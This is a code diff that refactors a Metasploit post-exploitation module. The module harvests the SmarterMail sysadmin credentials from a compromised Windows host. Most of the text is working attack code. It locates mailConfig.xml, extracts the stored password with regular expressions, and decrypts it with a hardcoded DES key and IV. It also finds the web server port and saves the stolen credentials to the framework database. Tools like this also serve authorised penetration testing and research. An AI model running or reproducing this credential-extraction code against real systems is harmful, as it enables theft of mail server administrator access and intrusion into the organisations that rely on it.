@@ -1,41 +1,43 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/auxiliary/report'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'          => 'Windows Gather SmarterMail Password Extraction',
-      'Description'   => %q{
-        This module extracts and decrypts the sysadmin password in the
-        SmarterMail 'mailConfig.xml' configuration file. The encryption
-        key and IV are publicly known.
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather SmarterMail Password Extraction',
+        'Description' => %q{
+          This module extracts and decrypts the sysadmin password in the
+          SmarterMail 'mailConfig.xml' configuration file. The encryption
+          key and IV are publicly known.
 
-        This module has been tested successfully on SmarterMail versions
-        10.7.4842 and 11.7.5136.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Joe Giron',                           # Discovery and PoC (@theonlyevil1)
-        'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
-        'sinn3r'                               # shell session support
-      ],
-      'References'    =>
-        [
+          This module has been tested successfully on SmarterMail versions
+          10.7.4842 and 11.7.5136.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Joe Giron', # Discovery and PoC (@theonlyevil1)
+          'bcoles', # Metasploit
+          'sinn3r' # shell session support
+        ],
+        'References' => [
           ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
         ],
-      'Platform'      => ['win'],
-      'SessionTypes'  => ['meterpreter', 'shell']
-    ))
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   #
@@ -43,54 +45,51 @@ class MetasploitModule < Msf::Post
   #
   def decrypt_des(encrypted)
     return nil if encrypted.nil?
-    decipher = OpenSSL::Cipher::DES.new
+
+    decipher = OpenSSL::Cipher.new('DES')
     decipher.decrypt
     decipher.key = "\xb9\x9a\x52\xd4\x58\x77\xe9\x18"
-    decipher.iv  = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
+    decipher.iv = "\x52\xe9\xc3\x9f\x13\xb4\x1d\x0f"
     decipher.update(encrypted) + decipher.final
   end
 
-
-  def get_bound_port(data)
+  def bound_port(data)
     port = nil
 
     begin
       port = JSON.parse(data)['BoundPort']
     rescue JSON::ParserError => e
-      elog("#{e.class} - Unable to parse BoundPort (#{e.message}) #{e.backtrace * "\n"}")
+      elog('Unable to parse BoundPort', error: e)
       return nil
     end
 
     port
   end
 
-
-  def get_remote_drive
-    @drive ||= expand_path('%SystemDrive%').strip
+  def system_drive
+    @system_drive ||= expand_path('%SystemDrive%').strip
   end
 
-
-  def get_web_server_port
+  def web_server_port
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = %Q|#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json|.strip
+      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json).strip
       if file?(path)
         data = read_file(path)
-        return get_bound_port(data)
+        return bound_port(data)
       end
     end
 
     return nil
   end
 
-
   #
   # Find SmarterMail 'mailConfig.xml' config file
   #
-  def get_mail_config_path
+  def mail_config_path
     found_path = ''
 
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = %Q|#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml|.strip
+      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml).strip
       vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
       if file?(path)
         found_path = path
@@ -106,13 +105,13 @@ class MetasploitModule < Msf::Post
   #
   def get_smartermail_creds(path)
     result = {}
-    data   = ''
+    data = ''
 
     vprint_status "#{peer} - Retrieving SmarterMail sysadmin password"
     begin
       data = read_file(path)
     rescue Rex::Post::Meterpreter::RequestError => e
-      print_error "#{peer} - Failed to download #{path} - #{e.to_s}"
+      print_error "#{peer} - Failed to download #{path} - #{e}"
       return result
     end
 
@@ -121,8 +120,8 @@ class MetasploitModule < Msf::Post
       return result
     end
 
-    username = data.match(/<sysAdminUserName>(.+)<\/sysAdminUserName>/)
-    password = data.scan(/<(sysAdminPassword|sysAdminPasswordHash)>(.+)<\/(sysAdminPassword|sysAdminPasswordHash)>/).flatten[1]
+    username = data.match(%r{<sysAdminUserName>(.+)</sysAdminUserName>})
+    password = data.scan(%r{<(sysAdminPassword|sysAdminPasswordHash)>(.+)</(sysAdminPassword|sysAdminPasswordHash)>}).flatten[1]
 
     result[:username] = username[1] unless username.nil?
 
@@ -150,7 +149,7 @@ class MetasploitModule < Msf::Post
     }
 
     credential_data = {
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -166,7 +165,7 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -177,7 +176,7 @@ class MetasploitModule < Msf::Post
   #
   def run
     # check for SmartMail config file
-    config_path = get_mail_config_path
+    config_path = mail_config_path
     if config_path.blank?
       print_error "#{peer} - Could not find SmarterMail config file"
       return
@@ -191,7 +190,7 @@ class MetasploitModule < Msf::Post
     end
 
     # report result
-    port = get_web_server_port || 9998 # Default is 9998
+    port = web_server_port || 9998 # Default is 9998
     user = result[:username]
     pass = result[:password]
     type = result[:private_type]
